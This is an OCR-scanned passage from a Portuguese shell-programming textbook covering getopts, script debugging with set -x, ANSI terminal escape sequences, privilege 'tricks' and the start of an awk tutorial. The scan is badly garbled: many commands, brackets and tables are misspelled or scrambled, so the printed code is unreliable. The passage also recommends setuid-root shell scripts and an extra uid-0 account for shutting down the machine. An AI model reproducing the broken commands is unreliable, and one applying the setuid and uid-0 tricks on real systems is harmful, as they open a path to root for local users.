getopts fez a variavel OPT LETRA igual a 'P ' 
OPTARG eh 'impressora ' 
Dispensando os primeiros $0PTIND-1 a 2 argumentos 
O que sobrou da linha de comandos foi 'arql arq2 ' 
Dessa forma, sem ter muito trabalho, separei todas as opções com seus 
respectivos argumentos, deixando somente os parâmetros que foram pas-
sados pelo operador para posterior tratamento. 
Repare que se tivéssemos escrito a linha de comando com o argu-
mento (impressora) separado da opção (- P) , o resultado seria exata-
mente o mesmo, exceto pelo OPTIND. já que nesse caso ele identifica 
um conjunto de três opções/argumentos e no anterior somente dois. 
Veja só: 
$ getoptst.sh -h - P impressora arql arq2 
getopts fez a variavel OPT LETRA igual a 'h ' 
OPTARG eh ' ' 
getopts fez a variavel OPT LETRA igual a 'P ' 
OPTARG eh 'impressora' 
Dispensando os primeiros $0PTIND-l • 3 argumentos 
O que sobrou da linha de comandos foi 'arql arq2' 
Opção -P separada do a~gumento 
Sacos de gatos 
331 
Repare, no exemplo a seguir, que se passarmos uma opção inválida, a 
variável soPT_LETRA receberá um ponto de interrogação (?) e a soPTARG 
será "apagada" (unsetl . 
$ getoptst. sh -f -Pimpressora arql arq2 
. getoptst . sh : illegal option -- E 
;etopts fez a variavel OPT_LETRA igual a ' ? ' 
OPT!\RG eh ' ' 
>etopts fez a variavel OPT_LETRA igual a ' P' 
OPTARG eh ' impressora ' 
D1spensando os primeiros SOPTIND- 1 = 2 argumentos 
O que sobrou da linha de comandos foi ' arql arq2 ' 
Em busca do erro perdido 
A opção -f não é valida 
Por vezes um script está dando "aquela dor de cabeça danada"; o progra-
ma não funciona e você não consegue detectar onde está o erro. Nesse 
caso, só resta "debugar'' o script, fazendo um trace. Para tal, basta você 
colocar no início do seu programa uma linha com a seguinte opção: 
set - x 
e no seu final coloque: 
set +x 
Em seguida execute o programa: 
$ ProgramaQueNaoFunciona 
A partir desse ponto, seu Pr ogramaQueNaoFunciona será executado em 
modo debug, isto é, passo a passo. Obviamente, se o script for longo, ou não 
interessar executar passo a passo todas as suas instruções, basta fazê-lo 
em apenas um trecho do programa. Para tal, coloque o set -x no início do 
trecho a ser depurado. Da mesma forma, para desligá-lo mais adiante, colo-
que o set +x na linha seguinte á rotina que lhe interessava monitorar. 
Suponha agora que, nas análises preliminares para eliminar o erro, você 
detectou que o problema só ocorria quando uma variável assumia um determi-
nado valor. Neste caso, para ligar o trace condicionalmente, podemos fazer: 
if { SVARIAVEL = valor 
then 
set -x 
332 Programação Shell Linux 
fi 
<trecho a debuga ~> 
Sêt +Y. 
ou ainda : 
( $VARIAVEL = valor } && set - >: 
<trecho a debuga r > 
set +x 
Analisando os fragmentos do programa anterior, você poderá, muito pro-
priamente, me perguntar: o que ocorrerá se o set +x for executado sem 
que antes eu tenha feito um set -x? 
Nada. Caso a opção esteja desligada, o set +x será ignorado, isto é, o 
trace pode ser desligado mesmo que não tenha sido previamente ligado. 
Essa forma de listar o scripf, durante a execução, vai mostrar cada linha 
de comando após a substituição das variáveis. Então como identificar quais 
os valores assumidos pelas variáveis? Podemos usar a opção "v- " para 
listar as linhas durante a leitura. Na verdade, na grande maioria das vezes, 
é mais conveniente usar uma combinação das duas opções: 
set -xv 
<trecho a .. debugar"> 
.set +xv 
Da mesma forma que antes, o " sec. +xv" desliga a opção. 
Um último par de dicas. Se um script "liga• o debug, apenas os scripts 
rodados com o comando ". " terão o debug ligado. Para evitar que fique 
algum debug ligado quando se reutiliza o ambiente (através do comando 
". "), é interessante colocar no final do script um desligar geral de debug, 
mesmo que o debug não tenha sido ligado: 
tJ 
De.sliga "debug" se tiver s i do l igado 
Sêt +xv 
ª f'im do script . . .. 
~1atcria com d r bs auto a.~s 
Sacos de gatos 
333 
Mandando no terminal 
Vinha há algum tempo estudando as facilidades para trabalhar com ter-
minais que o UNIX e o LINUX disponibilizam {man ctisplay no UNIX e 
man console_coctes no LINUX) e, analisando uma forma didática, com bons 
exemplos, para colocar nesta publicação a "sopa de letrinhas" que é este 
assunto, quando em uma "lntemetada" fui parar no endereço http://ver-
de666.org/coluna, que é uma página do super competente amigo Aurelio 
Marinho Jargas (vulgo "Guru das Expressões Regulares", que em assun-
tos de LINUX não tem nada de verde, está muito maduro), e para minha 
surpresa e satisfação, lá tinha tudo que eu queria, de forma muito elegante 
e de fácil leitura e compreensão. Ora, ter trabalho para quê? Todo o con-
teúdo desta seção foi devidamente •surrupiado", com sua autorização é 
claro. Peço aos leitores que gostarem da forma e do conteúdo que façam 
uma visita à sua home page, onde certamente acharão muito material inte-
ressante sobre o Sistema Operacional LINUX. Aurelio, curta muito Floripa 
e mais uma vez obrigado. 
Caracteres de controle para formatação de texto e movimentação do 
cursor: um assunto salgado, mas que fascina e apaixona quanto mais você 
aprende e mexe. Mas qual a graça de ficar posicionando o cursor na tela? 
Toda! O limite é sua imaginação, pode ser útil para fazer desenhos, anima-
ções, barra de status, interfaces que se atualizam ... 
Esses comandos são chamados ale sequências de escape, e veremos 
o padrão ANSI X3.64. O nome é apropriado, pois todas as sequências são 
precedidas pelo caractere Esc da tabela ASCII (código 033 octa1). 
As sequências funcionam em placas monocromáticas, em placas colori-
das, em emuladores e até naquela velharia de tela verde você pode brincar. 
Os comandos devem ser enviados diretamente ao terminal, ou seja, devem 
ser ecoados na tela. Para isso você pode usar qualquer um dos vários sa-
bores de p rint e printf existentes, mas nosso bom e velho echo também 
dá conta do serviço. 
As sequências são diferenciadas entre si por caracteres comuns, sendo 
o Esc inicial o único problemático para ecoar. Pode-se colocá-lo literal, 
apertando c trl+v, Esc (aparece '[), ou referenciá-lo por seu código octal, 
~1atcria com d r bs auto a.~s 
334 Programação Shell Linux 
usando a opção -e d o echo'". Como a quebra de linha geralmente não é 
desejada quando estamos mandando comandos para a tela, a opção - n 
também é necessária. 
Todas as sequências que veremos começam com um Esc seguido de 
um colchete, então Esc r é o nosso inicio padrão de sequência. Opa! Te-
mos uma exceção. O comando para limpar a tela, similar ao clear, é escc, 
que na sintaxe Bash seria: 
$ echo - ne '\033c ' 
E para ksh ou sh também poderia ser: 
$ eoho ' \033o\o• 
Então, para começar, vamos ver como definir cores para as letras e seus 
fundos. Esta sequência é geralmente a mais utilizada, porém possui diver-
sos parâmetros e merece atenção especial. Você que sempre quis saber 
como mostrar um texto colorido e não tinha a quem perguntar ou achava 
que era muito complicado, acompanhe! 
O formato do comando é ESC(nl: nz: •.. m, ou seja, abre com o padrão 
tsc-colchete e fecha com a letra eme. No meio temos números separados por 
ponto e vlrgula. O padrão, caso nenhum número seja informado, é zero. Va-
mos aos significados dos números, porém para ficar mais didático, devemos 
dividi-los em duas tabelas: a de atributos de vídeo e a de cores. A de cores 
descreve os códigos associados às cores do texto e às cores do fundo desse 
texto; a de atributos informa os códigos dos "modificadores" que interferem na 
forma como o texto e suas cores serão exibidos. Começamos pela primeira: 
Cód. 
Cor do Texto 
Cód. 
Cor do Fundo 
30 
texto preto (cinza) 
40 
fundo preto (cinza) 
31 
texto vermelho 
41 
fundo vermelho 
32 
texto verde 
42 
fundo verde 
33 
texto marrom (amarelo) 
43 
fundo marrom (amarelo) 
34 
texto azul 
44 
fundo azul 
--
35 
texto roxo 
45 
fundo roxo 
36 
texto ciano 
46 
fundociano 
37 
texto cinza (branco} 
47 
fundo cinza (branco) 
30. Lembre-se: a opção - c é necessária somente para o Bash. No sh e ksh. é ignorada. 
~la:cnu 
mJo 
Sacos de gatos 
335 
Vejamos agora a tabela de atributos: 
Cód. 
Atributo de Video 
O 
desliga tudo (votta ao normal) 
1 
cor brilhante 
---
5 
pisca-plsce 
7 
vldeo reverso (inverte letra e fundo) 
Os números são lidos de forma sequencial e adicional, então 44; 31; 1; 5 
é: fundo azul, com letra vermelha e brilhante (clara), e ainda piscando, 
confira: 
$ eeho -e '\033(44;31;1;5m azul e vermelho \033 (m' 
Note que a cor brilhante geralmente indica a mesma cor, porém clara. 
por exemplo: vermelho claro, verde claro. e assim vai. As exceções são 
o marrom que vira amarelo, o preto que vira cinza e o cinza que vira 
branco. 
Aqui vai um script superútil para lhe mostrar todas as combinações pos-
síveis com os códigos de cores. Guarde e use! 
$ ca. t co rés .. sh 
i !/bin/sh 
M cores.sh - mostra todas as cores do console 
for letra in O 1 2 3 4 5 6 7; do 
fo.r bol d in ' ' '; 1'; do 
for fundo in O 1 2 3 4 5 6 7: do 
seq• "4$fundo; 3$letra" 
echo -ne "'\033{$seqS(boldlm sseq$!bold:-
1 \033(m" 
done: echo 
done 
done 
Agora que já sabemos como colorir um texto, vamos ver como colocá-lo 
exatamente onde queremos na tela. O formato padrão dos comandos de 
movimentação é Esc [ <quantidade><cornando> . Vamos começar com os co-
mandos de movimentação simples, os mais comuns: 
336 Programação Shell Linux 
Comando 
Padrão 
Move o Cursor ... 
ESC [nA 
n=1 
n linhas para cima. na mesma coluna 
ESC [nB 
n=1 
n linhas para baixo, na mesma coluna 
ESC [nC 
n=1 
n colunas para a direita, na mesma linha 
ESC [nO 
n=1 
n colunas para a esquerda. na mesma tinha 
ESC [nE 
n=1 
n linhas para baixo, na coluna 1 
ESC [nF 
n=1 
n linhas para cima, na coluna 1 
ESC (nG 
n=1 
para a coluna n da linha atual 
ESC [n;mli 
n=1,m=1 
para a coluna m da linha n 
É fácil, basta ecoar o comando e o cursor vai dar o pulo, por exemplo, 
esc I SE pula para o começo da s• linha abaixo da posição atual. 
Bem, para ficar mais visual o que cada comando desses faz, aqui vai 
um "gráfico" de exemplo de movimentação do cursor com os comandos, 
sendo executados com seus valores padrão (n=1 ,m=1) a partir da posição 
marcada pelo ponto, que está na linha 4, coluna 7: 
123456789 
1 
2 
3 
A 
4 
D.C 
5 
B 
6 
E como um exemplo prático, este comando irá gerar o conteúdo do grá-
fico anterior: 
echo - e '\033c\ 033[4;7H.C\033[300\ 033[AA\033[2B\033(0B ' 
Na análise dessa linha veremos: 
\033c 
\ 033(4 ; 7li. C 
\033[300 
\033 [AA 
Limpa a tela 
Escreve ... c" na linha 4, coluna 7 
Movimenta cursor três colunas á esquerda e escreve " o" 
Sobe o cursor uma linha e na mesma coluna escreve "A" 
Sacos de gatos 
337 
\033[28 
\033 [DB 
Desce o cursor duas linhas, na mesma coluna 
Volta uma coluna na mesma linha e escreve " B" 
Além desses, temos outros comandos de movimentação e outros para 
apagar trechos de texto, confira: 
Comando Padrão 
{ 
""'o 
ESC (nl 
(n: 1) 
apaga até o começo da tela 
(n .. 2) 
,!!E!!lla a leia toda 
{ 
n=O 
(n=O) apaga até o fim da linha 
ESC (nK 
(n"1) 
apaga até o começo da linha 
J.r=~ apaga a 11nha toda 
esc [ n.~ 
" " 1 
apaga 11 linlias para baixo 
ESC [nP 
n:1 
apaga n caracteres à direita 
ESC [nX 
" " 1 
limpa n caracteres à direita (coloca aspaços) 
ESC (nll 
n=1 
insere o espaços em branco 
ESC [mL 
n=1 
insere n linhas em branco 
ESC [nS 
n=1 
move a tela n linhas para cima 
ESC (nT 
n=1 
move a tela n linhas para baixo 
Bem, as tabelas estão aí e você já sabe como ecoar os comandos na 
tela. Agora é só soltar a imaginação e brincar com os caracteres. Para 
fechar, dois dos exemplos mais clássicos de posicionamento de cursor: a 
tradicional barra de status, que usa pulos, inserção e apagamento: 
for 1 ~n 1 2 3 4 5 6 7 8 9 
elo 
done 
ce ho 
echo - ne " \033 [G\033[@8\033[11G\033 [ 0K$i " 
s l eep 1 
e, é claro, a clássica hélice ASCII: 
done 
for a i n I - \\ \1 
do 
echo -ne " \033[DSa" 
done 
~la:cnu 
mJo 
338 Programação Shell Unux 
Vale lembrar que alguns comandos como o tput ou bibliotecas como 
ncurses visam facilitar a tarefa de posicionamento de texto e desenho de 
caixas e botões, com funções já prontas para fazer isso. Mas que graça 
isso tem se você pode fazer tudo na mão e reinventar a roda? & : ) 
Macetes, macetes & macetes 
Quando você se "Ioga", imediatamente recebe um She/1. 
Qual Shetn Bash, sh , ksh, csh, ... ? Qual deles? 
Qualquer um. As vezes nenhum desses tradicionais. 
Como assim? Você não disse que quando eu me logo ganho imedia-
tamente um Shetn 
Sim eu disse isso, mas o She/1 que você ganha é o que está especifi-
cado no último campo do seu registro no arquivo /etc/passwd . 
Nunca esquecendo que o LINUX e o UNIX são sistemas multiusuários, é 
comum, em alguns sabores, só o root poder executar o programa de shutdown 
que desliga a máquina. E como o admin deve proceder para não dar a senha 
do root para quem eventualmente precisar desligar o computador? 
Bem, para fazer o proposto existem duas maneiras, que são dois belos 
macetes: 
Macete #1 - Suponha que você escreveu um programa para desligar o 
computador chamado "desliga". Para torná-lo executável somente pelo 
root você faz: 
$ chmod 744 desliga # Somente o dono pode executá-lo 
$ chown root desliga # O dono passa a ser o root 
$ ls -1 desliga 
-rwxr--r-- 1 julio dipao 416 May 3 10 :53 desliga 
~ Este é o 1 s · 1 a que você está habituado I 
Bem, dessa forma o problema continua, pois só o root pode executá-lo, 
mas se você tivesse feito o chmoà assim: 
$ chmod 4744 desliga 
Sacos de gatos 
339 
Você teria "selado" o user-id ou feito um SU/0, isto é, no momento em 
que qualquer pessoa estiver executando o desliga, ele terá os direitos do 
seu dono; ora, como o dono é o root, durante a execução do desliga essa 
pessoa terá a permissão do root. 
Agora vamos dar uma olhada na pinta deste arquivo: 
$ ls -1 desliga 
-rwsr-·r-- l jullo dip.,o qJ6 May 3 10 : 53 dediga 
% Olha quem apareceu aqui!! I 
Não são todos os sabores de Unix nem todas as distros de Linux 
que aceitam o SU/0 em scripts She/1. Se for esse o seu caso, é 
necessário fazer um programa em C, no qual aplicaremos o SU/0, 
timrm e que receberá como parâmetro o nome do script, chamando-o 
para execução sob o seu SU/0. 
Já que chegamos até aqui, deixe-me mostrar os três valores possíveis 
para este último bit do chmod: 
LI Valor do Bit 
1 
2 
4 
Significado 
Stick bit 
Group·id bit 
User-id bit 
Quando um programa está com o Stick bit ligado, esse programa não 
sai da memória, nem faz paginação. Deve ser usado com muita parci-
mônia e somente em rotinas frequentemente usadas por muitos usuários 
simultaneamente. 
O Group-id bit comporta-se da mesma forma do User-id bit, exceto 
que o usuário, durante a execução de um programa com este bit ligado, 
passa a ter todos os direitos do grupo ao qual pertence este arquivo de 
programa. 
~la:cnu 
mJo 
340 Programação Shell Linux 
Obviamente, você pode ligar mais de um desses bits simultaneamente. 
Assim. para ligar os três, basta somar os seus valores, fazendo: 
$ chmod 7744 desliga 
~ 1+2+4 1 
Macete #2-Como eu disse antes, quando você se "Jogasse" ganharia como 
She/1 o programa que está especificado no último campo do seu registro no 
arquivo /et c / pass<·id . Então, poderia ser criado na sua instalação um usu-
ário chamado, digamos, "desligado!", que tivesse como She/1 o programa 
deosliga . Quando o seu registro em 1 etc/pass>~d for editado para colocar 
de sliga como seu She/1 padrão, aproveite e faça seu user-id (segundo cam-
po do /et.c/passHdl igual a zero. Ora, como a definição de root é "todos que 
têm user-id igual a zero", o usuário desligador passará a ser um root, porém 
o seu She/1 padrão (o programa desliga) fará com que, ao se "Jogar", a má-
quina seja desligada, sem possibilitar-lhe mais nada além disto. 
Exercícios 
1. Escreva uma função para colocar na tela uma mensagem aguardan-
do que o operador tecle <ENTER> para poder continuar. Essa rotina 
será chamada recebendo a mensagem, a linha e a coluna. Caso a 
coluna não seja passada, a mensagem deverá ser colocada no cen-
tro da linha especificada. 
2. Fazer um programa (usando a instrução eval) que liste os paràmetros 
recebidos em ordem inversa. 
_tf}_ 
Mate 
com d re l s 
1 • s 
Apêndice 1 
awk: Comando ou 
Linguagem? 
Você decidirá ao longo deste apêndice se o awk é um co-
mando ou uma linguagem de programação. Alguns o cha-
mam de instruçáo, talvez devido à sua total integração ao 
She/1, eu não tenho dúvidas em qualificá-lo como uma lin-
guagem, e por isso mesmo relutei um pouco antes de in-
clui-lo em um livro sobre programação She/1, porém, por ser 
muito utilizado, pela sua integração e interação com o She/1 
e por ser, por vezes, a melhor ferramenta para resolver de-
terminados problemas, resolvi, devido à sua complexidade 
e recursos, dedicar este apêndice inteirinho a ele. Podería-
mos dizer que este é "o algo mais que o Shelllhe dà". 
Você sabe o que significa a·,;.: em inglês? Náo? Nada! 
É isso mesmo, nada! Náo existe esta palavra em inglês. 
a"k é um acrônimo formado pelos nomes dos três progra-
madores que escreveram o comando3'. com a finalidade 
de englobar as funções da família grep (grep, 
fgrep e 
egrep) e do sed . 
A partir deste ponto daremos uma rapidinha, entenden-
do as principais facilidades do av:k, adquirindo conheci-
mentos para, nas seções seguintes, nos aprofundarmos 
em cada um dos itens que veremos a seguir. 
31. Alfred v. 8 ho, Peter J. Weinberger, e Brian W. JS.ernighan (é ele mesmo! 
O cara que bolou o C). 
341 
Mate 
com d re l s 
l • s 
342 Programação Shell Linux 
O Be-a-bá do awk 
A operação básica do a•lk é pesquisar um conjunto de linhas de entrada, 
uma após a outra, procurando as que satisfaçam a um conjunto de padrões 
ou condições especificadas por você·. Para cada padrão você pode espe-
cificar uma ação; esta ação é executada para cada linha em que o padrão 
seja encontrado. 
Veja só a sua estrutura básica: 
{padrao] 
[f ação I ) 
Exemplos: 
awk '$1 == "Paula" ( p..ri n t $2 , $3 , ' 
O exemplo anterior é uma típica instrução awk, consistindo de um co-
mando tipo "padrão-ação". A instrução mostrada imprime o segundo e o 
terceiro campos de cada linha entrada a partir do teclado (já que nenhum 
arquivo foi mencionado), cujo prime·iro campo seja Paula . Em geral, o 
comando a wk, para cada padrão que encontra, a ação especificada (que 
pode envolver diversos passos) é executada. Então a próxima linha é lida e 
a pesquisa do padrão é feita novamente. Esse processo tipicamente conti-
nua até que toda a entrada seja lida. 
Qualquer um dentre o padrão ou a ação da dupla "padrão-ação" pode 
ser omitido. Se não for determinada uma ação, como em: 
$1 == "nome" 
a linha cujo primeiro campo for nome será toda impressa. Ao passo que se 
não for definido o padrão, como em: 
( print $1, $2 } 
a ação será executada para todas as linhas da entrada definida. Já que tan-
to os padrões quanto as ações são opcionais, as ações devem ser escritas 
entre chaves r r l 1 , para distingui-las dos padrões. 
~1atcria com d r bs auto a.~s 
awk: Comando ou Linguagem? 
343 
Uso do awk 
Você pode executar o awk de duas formas: 
-
Diretamente a partir do teclado da seguinte maneira: 
awk '<padrao-acao> ' (arquivo1) [a rqui vo! ) . . . [ar:quivo
11
) 
Note que a dupla "padrão-ação" vem sempre entre apóstrofos. Isso serve 
para inibir do She/1 a interpretação de caracteres como o cifrão 1 s l e para 
permitir que o comando se prolongue por quantas linhas forem necessárias. 
Esta forma de uso do a wk ê particularmente útil quando a instrução ocu-
pa poucas linhas. 
-
A partir de um arquivo de comando, usando a opção -f e fazendo 
assim: 
awk - f <arquivo de programa> <lis1:a de arqui vos de en~ rad<l> 
Campos 
A leitura dos dados ê feita registro a registro, que é por default uma sequên-
cia de caracteres terminada por um new-line (ASCII l Ol . Então, cada re-
gistro lido ê dividido em campos, que, por default, são uma sequência de 
caracteres separados por <TAB> !As c ii 9 l ou por espaços em branco. 
O que foi dito sobre a variável H's (Inter Field Separator) não se 
aplica no ambiente do awk, isto é, caso façamos o IFs igual a 
qualquer caractere, este caractere não passará a ser o separador 
1-id@l·l default entre os campos dos registros de entrada. 
Para continuarmos nossas explicações, vamos ressuscitar o moribundo 
tel e fones . Vamos analisá-lo novamente: 
$ c a t tel efo nes 
Ciro Grippi 
(0 21 ) 5 55- 1 234 
Claudi a Marcia 
(021) 555- 2112 
Enio Cardoso 
(0 23) 232-342 3 
Jul i ana Duart e 
(024 ) 6 22- 28 7 6 
Luiz Ca r l os 
(0 21 ) 7 67- 212 4 
Ne y Gar rafas 
(0 21 ) 988- 3398 
Ney Gerha r dt 
(0 2 4 ) 54 3-4 32 1 
Paul a Duarte 
(Oll) 449 - 0 219 
~1atcria com d r bs auto a.~s 
344 Programação Shell Linux 
Repare que cada registro possui o nome e o telefone (com código de 
DDD) separados por <TAB>, e o primeiro nome é separado do segundo por 
um espaço em branco. 
O número de campos de um registro é definido pela quantidade de 
separadores, ora, como os separadores defau/t são branco e <TAB> em 
telefones temos três campos. Isso seria verdade se os separadores fos-
sem sempre esses, mas, felizmente, podemos definir o separador que que-
remos utilizar. Se o definíssemos como <TAB>, por exemplo, os registros 
teriam então somente dois campos. Um pouco mais à frente veremos como 
fazer isso, mas por enquanto deixemos como está; desta forma o primeiro 
campo de cada registro seria chamado Sl, o segundo $2 e assim por dian-
te. O conjunto de todos os campos. O·U seja, o registro, seria so. 
& 
Fique atento para não confundir as variáveis do a"'k com os parâ-
metros do Shell. No primeiro, o conjunto de todas as variáveis é 
~~ 
so, no segundo so devolve o nome do programa, e o conjunto de 
i ·@i{!ol todos os parâmetros está na variável s• . 
Listando 
Olha só este comando: 
awk 
1 {print ) ' telefones 
Como não foi passado nenhum padrão para o comando, este atuará em 
todos os registros de tel e fones, e como também não selecionamos cam-
po algum para imprimir, serão impressos todos os campos. Vamos então 
executá-lo para ver se isso é verdade: 
Exemplo: 
$ awk '(print) ' telefones 
C.i.ro Grippi 
(0 2 l ) 555- 1234 
Cl audi a Marc ia 
(0 21 ) 555-2112 
Enio Cardoso 
(0 23) 2 32·3423 
Juliana Duarc;e 
(024) ó22- 2876 
Luiz Carlos 
(021) 767-2124 
Hey Garrafas 
(021 )988- 3398 
Ney Gerha rdt 
(024 ) 543 - 432 1 
Paul a Duarte 
(011) 4 49-0219 
~1atcria com d r bs auto a.~s 
awk: Comando ou linguagem? 
345 
Funcionou! O que fizemos foi exatamente o mesmo que: 
cat telefones 
E para imprimir o primeiro e o terceiro campos? Como deveríamos proce-
der? Ah! Essa é fácil, basta mandar imprimir o s1 e o s3. Então vejamos: 
$ awk '{print $1 , $3}' telefones 
Ciro (021)555-1234 
Claudia <021)555- 2112 
Enio (023)232- 3423 
Juliana (024)622-2876 
Luiz (021) 767-2124 
Ney (021)988-3398 
Ney (024)543-4321 
Paula (011) 449-0219 
Repare que no comando, os argumentos do print ($1 e S3) estão se-
parados por vírgula (, ). 
Esse tipo de impressão é o trivial, podemos colocar floreados quando 
estamos listando registros de arquivos. Para fazer isso vamos analisar a 
impressão formatada que, já vou avisando, é a cara da sua equivalente em 
linguagem C e também da sua congênere em She/1 script. 
Seu formato geral é: 
princf formato expr .• expr. , ... , expr 
que lista os expr,s , de acordo com as especificações feitas em formato . 
Para clarear, vejamos a execução de uma linha de awk : 
Exemplo: 
$ awk ' ( printf "%7s %13s\n" , $1 , $3 } ' telefones 
Ciro <021>555- 1234 
Claudia (021)555-2112 
Enio (023)232-3423 
Juliana (024)622-2876 
Luiz (021) 767-2124 
Ney (021)988- 3398 
Ney (024)543-4321 
Paula (011) 449-0219 
346 Programação Shell Linux 
No exemplo anterior, usando mais uma vez o cansado arquivo t.;l.,fones, 
listamos o primeiro campo (Sl l como uma cadeia de 7 caracteres justifi-
cados à direita ( t 7s>, seguido de um espaço em branco (entre o •7s e 
o •13s}, o terceiro campo (S31 , como uma cadeia alfanumérica de 13 
caracteres alinhados à direita (H3s l e finalmente mandamos saltar linha 
(new fine -
\ n). 
O p rintf não produz separadores entre campos ou salto de linha au-
tomaticamente; você sempre deverá lembrar-se desse detalhe, de forma a 
programar relatórios agradáveis à leitura. O prim: f não se limita a estas 
características. é muito mais abrangente. Adiante veremos detalhadamen-
te todo o seu potencial. 
Formando padrões 
Até aqui vimos, superficialmente, como se utiliza e como se comporta o 
aV~k . A partir de agora, daremos um mergulho mais fundo na construção 
dos comandos, esmiuçando primeiramente o uso dos padrões. 
Os padrões são utilizados para selecionar registros que atendam a 
uma determinada condição. O ao1k possui três formas de definir pa-
drões: 
Padrões chamados expressões relacionais, que servem para 
selecionar registros que atendam a determinadas condições de 
comparação; 
Padrões chamados expressões regulares para selecionar registros 
que contenham determinadas cadeias de caracteres; 
Padrões especiais chamados BEGIN e 
~::No que servem para deter-
minar instruções a serem executadas ANTES do processamento do 
primeiro registro e APÓS o último, respectivamente. 
Expressões relacionais 
Os padrões relacionais, que servem para estabelecer comparações, 
atendem ao set de comparações definidos pela linguagem C. que 
são: 
Mate 
com d re l s 
l • s 
awk: Comando ou linguagem? 
Operadores 
Resultados 
Igual a 
> 
Maior que 
>= 
' 
Maior ou Igual 
< 
Menor que 
<= 
I 
Menor ou Igual 
que também podem ser usados com os seguintes operadores lógicos: 
I 
Exemplo: 
Operadores 
r.& 
li 
J 
Resultados 
E 
Ou 
Não 
347 
Para mostrar que os padrões de comparação podem ser usados para com-
parar não só números como também cadeias de caracteres, vamos listar os 
registros de telefones a partir da letra • J": 
$ a wk • $1 > •J" ( print ) ' telefones 
Juliana ouart~ 
(024) 622-2876 
Se o •.r fosse minúsculo, o tesultedo seria errado 
Luiz Carlos 
Ney Garrafas 
Ney Gerha<dt 
Paula ouact.e 
(021) 767-2124 
(02!) 988-3398 
(024) 543-4321 
(0 11) 449-0219 
Podemos também montar expressões compostas. As expressões com-
postas combinam padrões simples com os operadores lógicos 1 1 (ou), && 
(e) e ! {não). 
Por exemplo, suponhamos que eu saiba que o segundo nome da pes-
soa da qual eu quero o telefone começa pela letra C ou pela letra O. Para 
selecionar os registros do arquivo telefones que atendam a esse critério 
de comparação eu podia fazer um programa assim: 
$ awk '$2 >="C" && $2 < "t:'" ' pxint ) ' telefones 
C:nio CArdoso 
(023) 232·3423 
Jullana Duarte 
(OH) 622·2876 
Luiz Carl os 
(02 1) 767- 2124 
Paula Duarte 
(011)449-0219 
~la:cnu 
mJo 
348 Programação Shell Linux 
Observe, no exemplo anterior, que a pesquisa foi feita para que o segundo 
campo !S2 l fosse maior ou igual a C e (&&I menor que E, ou seja, O se-
guido de qualquer outra(s) letra(s). 
Expressões regulares 
Para pesquisar um arquivo procurando por uma cadeia de caracteres, usa-
mos expressões regulares, e para o fazermos, devemos colocar o argumen-
to a ser encontrado entre um par de barras < 111, como já havíamos visto no 
sed, no ed e no grep e que tem o Apêndice 2 inteirinho só para elas. 
Exemplo: 
Para listar os registros de telefones cujos nomes comecem pela letra 
·c·. poderíamos fazer: 
$ awk '/C/ { print ) ' tolofonos 
Ciro Grippi 
(021)555- 1234 
Cl audi a Marc i a 
(021)555-2 112 
Enio Cardoso 
Luiz Carl os 
(023) 232-3423 
(021) 767-212q 
Pesquisa C maiúsculo no arquivo, como no sed 
Resuffado mesperado, mas existe Q no registro 
Idem 
Os dois últimos registros encontrados são indesejáveis, porém, dentro 
da nossa pesquisa, o resultado está correto. Para fazer a pesquisa somen-
te no primeiro campo ($ll , deveríamos fazer: 
$ awk '$1- /C/ ( print } ' telefonas 
Cizo Gripp i 
(021) 555-123<1 
Claud i a Marcia 
(021 ) 555- 2112 
Em awk, costumo chamar o li(-) de •atende a• 
Agora, vamos fazer o oposto, isto é , vamos listar os registros das pesso-
as cujo nome não começa pela letra C: 
$ awk '$1 
! ~
/C/ { print )' tel efones 
~nio Cardo•o 
(0231232-3423 
Juliana Oua Lte 
(024) 622- 2876 
Luiz Carl os 
(021)767-212 4 
Ney Garrafas 
(021) 988- 3398 
Ney Gerha r de 
(024)543-4321 
Paul a Duarte 
(Oll) 419-0219 
Conforme foi afirmado, a pesquisa é feita colocando o argumento a 
ser encontrado entre um par de barras <I / J . Se quisermos especificar o 
~1atcria com d r bs auto a.~s 
awk: Comando ou linguagem? 
349 
campo a ser procurado, devemos usar a sintaxe do segundo e do terceiro 
exemplos, ou seja: 
Sn ~ <expressao regular.> 
testa se o enésimo campo atende à expressao regular e: 
$n ! -
<expressao regular> 
é o seu oposto; testa se o enésimo campo não atende à e xpressao regular . 
Trabalhando com expressões regulares, os símbolos 1 ) ( J \ 
A 
$ . * 
? + 1 são metacaracteres com sentido especial, com o uso muito similar 
ao do comando egrep . Dessa forma, os caracteres 
A e $ servem para 
pesquisar no início e no fim respectivamente; assim, se fizermos: 
estaremos pesquisando todos os registros que contenham somente a le-
tra L, ou seja, no início <A> tenha a mesma letra L que também estará 
o fim ($) . 
Um grupo de caracteres entre colchetes 1 l J > servirá para pesquisar 
os registros que tenham um desses caracteres. Veja só o comando para 
listar todas as linhas começadas pela letra r em caixa alta ou baixa do 
arquivo quequeisso : 
$ awk '/A[ii)/ { print }' quequeisso 
interfaceando com os usuarios , tem tambem as seguintes atribuicoes ; 
Interpretador de comandos; 
O uso de parênteses o serve para agrupar e a barra vertical < 1 > serve 
como ou lógico. Para listar todas as linhas de quequeisso que contenham 
a cadeia cada ou a cadeia programa , fazemos: 
$ awk '/(cada 1 programa)/ ( print}' quequeisso 
O Shell alem de analisar cada dado entrado a partir do prompt do UNIX, 
Execucao de programas; 
Poderosa linguagem de programacao . 
Veja o exemplo a seguir: 
$ awk '$3 ~ /A\([0-9)+\)/ ( print )' telefones 
Ciro Grippi 
(021) 555-1234 
350 Programação Shell Linux 
c l audia J.lla::cia 
Enio Cardoso 
Juliana Dth\rte 
Luiz Carl os 
Ney Garrafas 
Ney Gerhd rdt 
Paula oua.rt.e 
(021 ) 555-2112 
(023) 232-3423 
(024) 622 - 2876 
(021 ) 767-2124 
(011) 988-3398 
(024) 543-4321 
(011) 449- 0219 
Pesquisamos no terceiro campo (campo de telefone) tudo que começava 
c h> por abre parênteses <o , tinha a seguir um dígito numérico ( ro-91) , 
seguidos de outros c+l números e depois um fecha parênteses c 1 1. 
As barras invertidas l \ ) foram utilizadas para inibir a interpretação do 
She/1 sobre os parênteses o . 
É interessante destacar que o sinal de mais (+l no contexto do a'"k 
significa repetição do último padrão (veja o apêndice 2 sobre expressões 
regulares). Então, para pesquisar se um campo de um arquivo possui al-
gum caractere não numérico, devemos fazer: 
!/' (0-9J ·•S/ 
O ponto de espantaçâo està negando todo o padrão 
Se nós fizermos: 
pad , , pa<l. { . . . l 
estaremos selecionando todos os registros que atendam desde o padrão 
pact. até o padrão pad . 
Para exemplificar, vamos pesquisar em telefones todas as pessoas 
cujos primeiros nomes contenham desde a letra E até a letra N: 
